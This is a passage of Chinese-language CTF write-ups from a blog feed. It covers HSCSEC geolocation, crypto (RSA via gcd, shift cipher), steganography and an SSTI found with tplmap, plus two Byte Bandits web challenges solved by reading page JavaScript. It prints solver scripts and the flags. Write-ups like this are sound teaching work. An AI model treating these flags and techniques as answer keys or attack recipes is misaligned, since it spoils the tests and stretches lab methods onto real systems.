src="/mdimg/hscsec/16.png"><br>地图上找位置<br><code>HSCSEC&#123;甘肃省白银市白银区金岭公园&#125;</code></p><h3 id="Airplane"><a href="#Airplane" class="headerlink" title="Airplane"></a>Airplane</h3><p><img src="/mdimg/hscsec/17.png"><br>一直分析飞机无果<br>重庆航空，飞机注册号B-30EL<br><img src="/mdimg/hscsec/18.png"><br>然查找B-30EL发现：<a href="https://www.jiemian.com/article/5391407.html">https://www.jiemian.com/article/5391407.html</a><br><img src="/mdimg/hscsec/19.png"><br><img src="/mdimg/hscsec/20.png"><br>大兴机场的鸟瞰图<br>对比吻合<br> <code>HSCSEC&#123; 北京市大兴区大兴国际机场&#125;</code></p><h3 id="Beautiful-Lake"><a href="#Beautiful-Lake" class="headerlink" title="Beautiful Lake"></a>Beautiful Lake</h3><p><code>flag形式为：HSCSEC&#123;&#125; 例如：HSCSEC&#123;广东省广州市天河区天湖&#125;</code><br>看图片左侧<br><img src="/mdimg/hscsec/21.png"><br>宁夏理工学院<br><img src="/mdimg/hscsec/22.png"><br><img src="/mdimg/hscsec/23.png"><br><code>HSCSEC&#123;宁夏回族自治区石嘴山市大武口区星海湖&#125;</code></p><h3 id="Beautiful-Park"><a href="#Beautiful-Park" class="headerlink" title="Beautiful Park"></a>Beautiful Park</h3><p><code>flag形式为：HSCSEC&#123;&#125; 例如：HSCSEC&#123;广东省广州市天河区天河国家湿地公园&#125;</code><br><img src="/mdimg/hscsec/24.png"><br><img src="/mdimg/hscsec/25.png"><br>地图搜<br><code>HSCSEC&#123;**河北省张家口市怀来县官厅水库国家湿地公园&#125;**</code></p><h3 id="Apple-Store"><a href="#Apple-Store" class="headerlink" title="Apple Store"></a>Apple Store</h3><p><code>flag形式为：HSCSEC&#123;&#125; 例如：HSCSEC&#123;广东省广州市天河区天河路1号&#125; 例如：HSCSEC&#123;广东省广州市天河区天河路1号环贸F1&#125;</code><br><img src="/mdimg/hscsec/26.png"><br>百度地图：苹果西单大悦城店<br><img src="/mdimg/hscsec/27.png"><br><code>HSCSEC&#123;北京市西城区西单北大街131号&#125;</code></p><h3 id="Tower"><a href="#Tower" class="headerlink" title="Tower"></a>Tower</h3><p>澳门巴黎铁塔附近<br>全景地图<br><img src="/mdimg/hscsec/28.png"><br>看图片应该是在楼梯这个位置拍的<br><code> HSCSEC&#123;澳门特别行政区路氹填海区澳门路氹金光大道连贯公路澳门巴黎人&#125;</code></p><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h3 id="Operator"><a href="#Operator" class="headerlink" title="Operator"></a>Operator</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/bin/python3</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long, getPrime<br><br>FLAG = <span class="hljs-string">&quot;*******************MASK****************&quot;</span><br><br><span class="hljs-comment"># print(FLAG)</span><br>number1 = getPrime(<span class="hljs-number">512</span>)<br>number2 = getPrime(<span class="hljs-number">1024</span>)<br><span class="hljs-built_in">print</span>(number1)<br>result = FLAG * number1 % number2<br><span class="hljs-built_in">print</span>(result)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Output:</span><br><span class="hljs-string">11488359375916816818731868252559119400126174593041608170883818546254791846479664455120194350355087017477744828351806157930199157462913063513512421460678471</span><br><span class="hljs-string">1890846045246997191702622225497063073251667816125412875121879991742654650976309481716690792328873189601779812108551290078049710826355501933349874438201643986975141068179879506727213209273645848165732801667704040761771</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>显然number2远远大于number1，且flag就30位左右，所以<code>FLAG * number1 mod number2</code> 其实就等于<code>FLAG * number1</code><br>直接<code>FLAG =result// number1</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span>*<br>number1=<span class="hljs-number">11488359375916816818731868252559119400126174593041608170883818546254791846479664455120194350355087017477744828351806157930199157462913063513512421460678471</span><br>result=<span class="hljs-number">1890846045246997191702622225497063073251667816125412875121879991742654650976309481716690792328873189601779812108551290078049710826355501933349874438201643986975141068179879506727213209273645848165732801667704040761771</span><br>flag=result//number1<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;HSCSEC&#x27;</span>+<span class="hljs-built_in">str</span>(long_to_bytes(flag))[<span class="hljs-number">6</span>:])<br><span class="hljs-comment">#HSCSEC&#123;qMmZqWvmj70bBsCfmVLT&#125;</span><br></code></pre></td></tr></table></figure><h3 id="EZRSA"><a href="#EZRSA" class="headerlink" title="EZRSA"></a>EZRSA</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> m<br><br>p = getPrime(<span class="hljs-number">1024</span>)<br>q = getPrime(<span class="hljs-number">1024</span>)<br>n = p * q<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n =&#x27;</span>,n)<br>e = <span class="hljs-number">0x10001</span><br>M = m * e * <span class="hljs-number">1</span> * <span class="hljs-number">2022</span> * p<br>c = <span class="hljs-built_in">pow</span>(M,e,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c =&#x27;</span>,c)<br><br><span class="hljs-comment"># n = 16266043783454053154037197753138388613864200794483663334493856481522764684650995230938142916968470804276539967429581472897698022852787399956166067156691430593337430691851251036378709799238876668312530223697905925939542713491015517460139150765778057817475571231361809654951289718071760502692960235551663466242938669673675870151921605230499603814070711617511206013584605131901906195136038060653121164252894949526861390984185085201067988694831398388037080993820517447099157891181179389949333832439004857436617834100885739716577641892686620423154860716308518151628754780994043553863224363539879909831811888663875989774849</span><br><span class="hljs-comment"># c = 12716190507848578560760116589677996073721225715245215495257947887969923319693501568134141757778665747980229898129090929698368855086594836111461700857934476682700625486249555753323344759513528101651108919161794915999809784961533946922607642974500946026677116418317599095703217004064379100607278317877894742815660315660254853364776654303066021672567442581774299847661025422994141801987588151758971034155714424052693627277202951522779716696303237915400201362585413354036973117149974017434406560929491956957193491445847385625481870256240443170803497196783872213746269940877814806857222191433079944785910813364137603874411</span><br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">M = m * e * <span class="hljs-number">1</span> * <span class="hljs-number">2022</span> * p<br>c = <span class="hljs-built_in">pow</span>(M,e,n)<br></code></pre></td></tr></table></figure><p>这里猜测可以公约数求p</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>n = <span class="hljs-number">16266043783454053154037197753138388613864200794483663334493856481522764684650995230938142916968470804276539967429581472897698022852787399956166067156691430593337430691851251036378709799238876668312530223697905925939542713491015517460139150765778057817475571231361809654951289718071760502692960235551663466242938669673675870151921605230499603814070711617511206013584605131901906195136038060653121164252894949526861390984185085201067988694831398388037080993820517447099157891181179389949333832439004857436617834100885739716577641892686620423154860716308518151628754780994043553863224363539879909831811888663875989774849</span><br>c = <span class="hljs-number">12716190507848578560760116589677996073721225715245215495257947887969923319693501568134141757778665747980229898129090929698368855086594836111461700857934476682700625486249555753323344759513528101651108919161794915999809784961533946922607642974500946026677116418317599095703217004064379100607278317877894742815660315660254853364776654303066021672567442581774299847661025422994141801987588151758971034155714424052693627277202951522779716696303237915400201362585413354036973117149974017434406560929491956957193491445847385625481870256240443170803497196783872213746269940877814806857222191433079944785910813364137603874411</span><br>e = <span class="hljs-number">0x10001</span><br>x=(c*gmpy2.invert(<span class="hljs-built_in">pow</span>(<span class="hljs-number">2022</span>,e,n),n)*gmpy2.invert(<span class="hljs-built_in">pow</span>(e,e,n),n))%n<br><span class="hljs-comment">#通过乘逆元然后求p，然后解RSA解出M</span><br>p=gmpy2.gcd(x,n)<br>q=n//p<br>d=gmpy2.invert(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>M=<span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-comment">#然后接着还原flag</span><br>m=M//e//<span class="hljs-number">2022</span>//p<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;HSCSEC&#x27;</span>+<span class="hljs-built_in">str</span>(long_to_bytes(m))[<span class="hljs-number">6</span>:])<br><span class="hljs-comment">#HSCSEC&#123;3e5e2789a93a80615cc35edbff397c05&#125;</span><br></code></pre></td></tr></table></figure><h3 id="EZVC"><a href="#EZVC" class="headerlink" title="EZVC"></a>EZVC</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> flag<br>alphabet = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!&quot;#$%&amp;\&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~&#x27;</span><br>key = <span class="hljs-string">&#x27;HSC&#x27;</span><br><span class="hljs-keyword">assert</span> flag.startswith(<span class="hljs-string">&#x27;HSCSEC&#123;&#x27;</span>)<br>flag_num_list = []<br>c = []<br><span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> flag:<br>    flag_num_list.append(alphabet.find(item) + <span class="hljs-number">1</span>)<br>key_num = alphabet.find(key) + <span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag_num_list:<br>    m = (i + key_num) % <span class="hljs-number">94</span> - <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> m == <span class="hljs-number">0</span>:<br>        c.append(<span class="hljs-string">&quot;□&quot;</span>)<br>    c.append(alphabet[m-<span class="hljs-number">1</span>:m])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c = &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(c)))<br><br><span class="hljs-comment"># c = GRBRDB`jg10ij2g01i,g201gi,2gi2,012igaigagi|</span><br></code></pre></td></tr></table></figure><p>逆推一下就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">alphabet = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!&quot;#$%&amp;\&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~&#x27;</span><br>key = <span class="hljs-string">&#x27;HSC&#x27;</span><br>c = <span class="hljs-string">&quot;GRBRDB`jg10ij2g01i,g201gi,2gi2,012igaigagi|&quot;</span><br>flag = <span class="hljs-string">&quot;&quot;</span><br>key_num = alphabet.find(key) + <span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> c:<br>    <span class="hljs-keyword">if</span> i == <span class="hljs-string">&quot;□&quot;</span>:<br>        m = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">else</span>:<br>        m = alphabet.find(i) + <span class="hljs-number">1</span><br>    flag_num = (m - key_num) % <span class="hljs-number">94</span> + <span class="hljs-number">1</span><br>    flag += alphabet[flag_num-<span class="hljs-number">1</span>:flag_num]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag = &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(flag))<br><span class="hljs-comment">#flag = HSCSEC&#123;kh21jk3h12j-h312hj-3hj3-123jhbjhbhj&#125;</span><br></code></pre></td></tr></table></figure><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h3 id="EZIMG"><a href="#EZIMG" class="headerlink" title="EZIMG"></a>EZIMG</h3><p><img src="/mdimg/hscsec/29.png"><br>010打开发现末尾有反过来的png<br>工具： <a href="https://github.com/AabyssZG/FileReverse-Tools">https://github.com/AabyssZG/FileReverse-Tools</a><br>逆序一下<code>python3 FileReverse-Tools.py -i desktop.png</code><br><img src="/mdimg/hscsec/30.png"><br><code>HSCSEC&#123;p3g_h</code><br><img src="/mdimg/hscsec/31.png"><br>在文件尾后发现01数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>MAX = <span class="hljs-number">25</span><br>pic = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>,(MAX, MAX))<br><span class="hljs-built_in">str</span> = <span class="hljs-string">&quotquot;</span><br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">0</span>,MAX):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">0</span>,MAX):<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">str</span>[i] == <span class="hljs-string">&#x27;1&#x27;</span>):<br>            pic.putpixel([x,y],(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>))<br>        <span class="hljs-keyword">else</span>:<br>            pic.putpixel([x,y],(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>))<br>        i = i+<span class="hljs-number">1</span><br>pic.show()<br>pic.save(<span class="hljs-string">&quot;flag.png&quot;</span>)<br></code></pre></td></tr></table></figure><p>转换为二维码<br><img src="/mdimg/hscsec/32.png"><br>加定点<br><img src="/mdimg/hscsec/33.png"><br><img src="/mdimg/hscsec/34.png"><br><code>flag2:aQR_c0de_and   </code><br><a href="https://www.wotianna.com/pixels/">https://www.wotianna.com/pixels/</a><br><img src="/mdimg/hscsec/35.png"><br><code>_3nc&#125; </code><br>综上所述：<code>HSCSEC&#123;p3G_haQR_c0de_and_3nc&#125;</code></p><h3 id="Salute"><a href="#Salute" class="headerlink" title="Salute"></a>Salute</h3><p><img src="/mdimg/hscsec/36.png"><br>末尾有一段MD5<br><code>5d93ceb70e2bf5daa84ec3d0cd2c731a</code><br><img src="/mdimg/hscsec/37.png"><br><code>qwer1234</code><br>文件异或qwer1234<br><img src="/mdimg/hscsec/38.png"><br>得到压缩包<br><img src="/mdimg/hscsec/39.png"><br>对png<br><img src="/mdimg/hscsec/40.png"><br><code>flag2/key that_is</code>意思是flag2和KEY都是that_is，那么前面解出来的那串应该就是flag1了<br>steghide分离<br><code>steghide extract -sf /home/kali/桌面/salute.jpg -p that_is</code><br><img src="/mdimg/hscsec/41.png"><br><img src="/mdimg/hscsec/42.png"><br><code>flag3:_c0ol&#125;</code><br>综上所述：<code>HSCSEC&#123;qwer1234that_is_c0ol&#125;</code></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h3 id="EZSSTI"><a href="#EZSSTI" class="headerlink" title="EZSSTI"></a>EZSSTI</h3><p>tplmap 一把梭<br>注入点是name<br><img src="/mdimg/hscsec/43.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Byte Bandits CTF 2023</title>
    <link href="/2023/02/10/Byte%20Bandits%20CTF%202023/"/>
    <url>/2023/02/10/Byte%20Bandits%20CTF%202023/</url>
    
    <content type="html"><![CDATA[<p>本次比赛的完整wp和题目附件已上传至微信公众：Hor1zon，关注公众号即可获取</p><p>传送门：<a href="https://mp.weixin.qq.com/s?__biz=Mzk0MzQyMTg4Ng==&amp;mid=2247484384&amp;idx=1&amp;sn=75c04b0a829fb9eb600633a8a4d88fb2&amp;chksm=c3356331f442ea275d26fcb3e7029667c4fe39b4259e853cbcc4e494670e304d6cc47ebf9024#rd">https://mp.weixin.qq.com/s?__biz=Mzk0MzQyMTg4Ng==&amp;mid=2247484384&amp;idx=1&amp;sn=75c04b0a829fb9eb600633a8a4d88fb2&amp;chksm=c3356331f442ea275d26fcb3e7029667c4fe39b4259e853cbcc4e494670e304d6cc47ebf9024#rd</a></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h3 id="Improper-Error-Handling"><a href="#Improper-Error-Handling" class="headerlink" title="Improper Error Handling"></a>Improper Error Handling</h3><p><img src="/mdimg/bbctf/1.png"><br>打开靶机是这样的<br><img src="/mdimg/bbctf/2.png"><br>先看源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;html&gt;<br>  &lt;head&gt;<br>    &lt;title&gt;Top Secret Project&lt;/title&gt;<br>    &lt;style&gt;<br>      body &#123;<br>        font-family: Arial, sans-serif;<br>        margin: <span class="hljs-number">40</span>px;<br>      &#125;<br>      form &#123;<br>        display: flex;<br>        flex-direction: column;<br>        align-items: center;<br>      &#125;<br>      label &#123;<br>        font-size: <span class="hljs-number">1.2</span>em;<br>        margin-bottom: <span class="hljs-number">10</span>px;<br>      &#125;<br>      input[type=<span class="hljs-string">&quot;password&quot;</span>] &#123;<br>        font-size: <span class="hljs-number">1.2</span>em;<br>        padding: <span class="hljs-number">5</span>px;<br>        width: <span class="hljs-number">400</span>px;<br>        margin-bottom: <span class="hljs-number">20</span>px;<br>      &#125;<br>      button &#123;<br>        font-size: <span class="hljs-number">1.2</span>em;<br>        padding: <span class="hljs-number">5</span>px <span class="hljs-number">10</span>px;<br>        background-color: #<span class="hljs-number">4</span>CAF50;<br>        color: white;<br>        border-radius: <span class="hljs-number">5</span>px;<br>        cursor: pointer;<br>      &#125;<br>      pre &#123;<br>        background-color: <span class="hljs-meta">#eee;</span><br>        padding: <span class="hljs-number">20</span>px;<br>        white-space: pre-wrap;<br>        margin-top: <span class="hljs-number">20</span>px;<br>        display: none;<br>      &#125;<br>      .error &#123;<br>        color: red;<br>      &#125;<br>    &lt;/style&gt;<br>  &lt;/head&gt;<br>  &lt;body&gt;<br>    &lt;h1&gt;Top Secret Project&lt;/h1&gt;<br>    &lt;form&gt;<br>      &lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;input&quot;</span>&gt;Enter the password:&lt;/label&gt;<br>      &lt;input type=<span class="hljs-string">&quot;password&quot;</span> id=<span class="hljs-string">&quot;input&quot;</span>&gt;<br>      &lt;button type=<span class="hljs-string">&quot;button&quot;</span> onclick=<span class="hljs-string">&quot;sendRequest()&quot;</span>&gt;Submit&lt;/button&gt;<br>    &lt;/form&gt;<br>    &lt;p class=<span class="hljs-string">&quot;error&quot;</span> id=<span class="hljs-string">&quot;error-message&quot;</span>&gt;&lt;/p&gt;<br>    &lt;pre id=<span class="hljs-string">&quot;debug-message&quot;</span>&gt;&lt;/pre&gt;<br>  &lt;/body&gt;<br>  &lt;script&gt;<br>    function sendRequest() &#123;<br>      let length = document.getElementById(<span class="hljs-string">&quot;input&quot;</span>).value;<br>      fetch(<span class="hljs-string">&quot;/api/error?length=&quot;</span> + length)<br>        .then(response =&gt; response.text())<br>        .then(text =&gt; &#123;<br>          <span class="hljs-keyword">if</span> (text.startsWith(<span class="hljs-string">&quot;Error&quot;</span>)) &#123;<br>            document.getElementById(<span class="hljs-string">&quot;error-message&quot;</span>).textContent = text;<br>            document.getElementById(<span class="hljs-string">&quot;error-message&quot;</span>).style.display = <span class="hljs-string">&quot;block&quot;</span>;<br>            document.getElementById(<span class="hljs-string">&quot;debug-message&quot;</span>).style.display = <span class="hljs-string">&quot;none&quot;</span>;<br>          &#125; <span class="hljs-keyword">else</span> &#123;<br>            document.getElementById(<span class="hljs-string">&quot;debug-message&quot;</span>).textContent = text;<br>            document.getElementById(<span class="hljs-string">&quot;debug-message&quot;</span>).style.display = <span class="hljs-string">&quot;block&quot;</span>;<br>            document.getElementById(<span class="hljs-string">&quot;error-message&quot;</span>).style.display = <span class="hljs-string">&quot;none&quot;</span>;<br>          &#125;<br>        &#125;);<br>    &#125;<br>  &lt;/script&gt;<br>  <br>&lt;/html&gt; <br></code></pre></td></tr></table></figure><p>定义了一个sendRequest()请求函数<br>访问：<br><code>/api/error?length=</code><br><img src="/mdimg/bbctf/3.png"><br>试试传参<br><img src="/mdimg/bbctf/4.png"><br>一步一步加长看看<br>当传任意参数到32位时，爆出了flag<br><img src="/mdimg/bbctf/5.png"></p><h3 id="Hi-Score"><a href="#Hi-Score" class="headerlink" title="Hi-Score"></a>Hi-Score</h3><p><img src="/mdimg/bbctf/6.png"><br>一秒点一百下就能拿flag<br>这种题，大概率跟js有关<br>先看看js<br><img src="/mdimg/bbctf/7.png"><br>调试器打开，找到一个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c">function _0x59a2() &#123;<br>var _0x78411b = [<br><span class="hljs-string">&quot;\x20cps&quot;</span>,<br><span class="hljs-string">&quot;clicks&quot;</span>,<br><span class="hljs-string">&quot;\x20Your\x20Reward\x20:\x20&lt;a\x20href=\x22&quot;</span> +<br><span class="hljs-string">&quot;2f2e736563726574696f6e2f666c6167&quot;</span><br>.match(/[\da-f]&#123;<span class="hljs-number">2</span>&#125;/gi)<br>.<span class="hljs-built_in">map</span>((h) =&gt; String.fromCharCode(parseInt(h, <span class="hljs-number">16</span>)))<br>.join(<span class="hljs-string">&quot;&quot;</span>) +<br><span class="hljs-string">&quot;\x22\x20download=\x22flag\x22&gt;Reward&lt;/a&gt;&quot;</span>,<br><span class="hljs-string">&quot;3526ccMajJ&quot;</span>,<br><span class="hljs-string">&quot;innerHTML&quot;</span>,<br><span class="hljs-string">&quot;4263236HVNRoh&quot;</span>,<br><span class="hljs-string">&quot;3656895VkgrIX&quot;</span>,<br><span class="hljs-string">&quot;503210VEeXpc&quot;</span>,<br><span class="hljs-string">&quot;toFixed&quot;</span>,<br><span class="hljs-string">&quot;5NfzyuJ&quot;</span>,<br><span class="hljs-string">&quot;8399912tBbEFu&quot;</span>,<br><span class="hljs-string">&quot;SCORE:\x20&quot;</span>,<br><span class="hljs-string">&quot;6379703kdfIqT&quot;</span>,<br><span class="hljs-string">&quot;getElementById&quot;</span>,<br><span class="hljs-string">&quot;getTime&quot;</span>,<br><span class="hljs-string">&quot;48bKPhCj&quot;</span>,<br><span class="hljs-string">&quot;14Xmxuhh&quot;</span>,<br><span class="hljs-string">&quot;reward&quot;</span>,<br><span class="hljs-string">&quot;9wOTYQU&quot;</span>,<br><span class="hljs-string">&quot;597OMUzhx&quot;</span>,<br><span class="hljs-string">&quot;2046510XnQiaG&quot;</span>,<br>];<br>_0x59a2 = function () &#123;<br><span class="hljs-keyword">return</span> _0x78411b;<br>&#125;;<br><span class="hljs-keyword">return</span> _0x59a2();<br>&#125;<br> <br></code></pre></td></tr></table></figure><p>看起来”\x20Your\x20Reward\x20:\x20&lt;a\x20href=\x22” +<br>            “2f2e736563726574696f6e2f666c6167”<br>这段是回显rewaard也就是flag的<br>一开始以为要解这个 2f2e736563726574696f6e2f666c6167<br>发现不行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">_0x59a2 = function () &#123;<br><span class="hljs-keyword">return</span> _0x78411b;<br>&#125;;<br><span class="hljs-keyword">return</span> _0x59a2();<br>&#125;<br></code></pre></td></tr></table></figure><p>看到这，可以运行_0x59a2()这个函数<br><img src="/mdimg/bbctf/8.png"><br>得到flag的地址<code>/.secretion/flag</code><br>访问下载打开<br><img src="/mdimg/bbctf/9.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022年春秋杯网络安全联赛 冬季赛-wp</title>
    <link href="/2023/02/09/2022%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%20%E5%86%AC%E5%AD%A3%E8%B5%9B-wp/"/>
    <url>/2023/02/09/2022%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%20%E5%86%AC%E5%AD%A3%E8%B5%9B-wp/</url>
    
